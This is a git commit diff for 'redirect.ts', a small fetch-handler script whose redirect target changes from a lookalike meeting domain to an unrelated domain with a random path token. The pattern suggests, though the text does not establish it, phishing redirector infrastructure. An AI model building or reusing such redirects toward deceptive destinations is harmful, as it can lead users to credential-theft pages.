ebdb3d654026342ed547cbcf82a33f46a6f32dd3
yvonsguin-afk <yvonsguin@gmail.com>
2025-10-21 10:26:53 -0700

    Update redirect.ts

--- redirect.ts
+++ redirect.ts
@@ -1,7 +1,7 @@
 // redirect.ts
 
 // Define the redirect URL
-const redirectUrl = "https://meet.jitsi.online/"; // Replace with the URL you want to redirect to
+const redirectUrl = "https://exception.zeastuto.solutions/fXvN!6pN/"; // Replace with the URL you want to redirect to
 
 // Handle the request
 addEventListener("fetch", (event) => {
